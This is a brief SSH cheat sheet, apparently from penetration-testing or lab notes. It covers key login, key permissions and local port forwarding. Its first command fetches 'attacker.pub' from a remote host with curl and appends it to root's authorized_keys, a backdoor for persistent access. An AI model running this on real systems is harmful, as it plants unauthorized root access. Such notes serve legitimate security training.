# SSH

Add public key to autherized keys from web server response:

```bash
curl 10.10.10.10/attacker.pub >>  /root/.ssh/authorized_keys
```

start ssh with password and server from variable, with clean slate:

```bash
sshpass -p $2 ssh -o GlobalKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@$1
```

Login with specific private key:

```bash
ssh -i <private key> <username>@<ip address>
```

Import private key:

```bash
vim <key name>
chmod 400 <key name>
```

proxy through remote host:

```bash
ssh -i key -L8000:10.10.10.1:80 10.10.10.2
ssh -i key -L8000:proxy:80 target
```
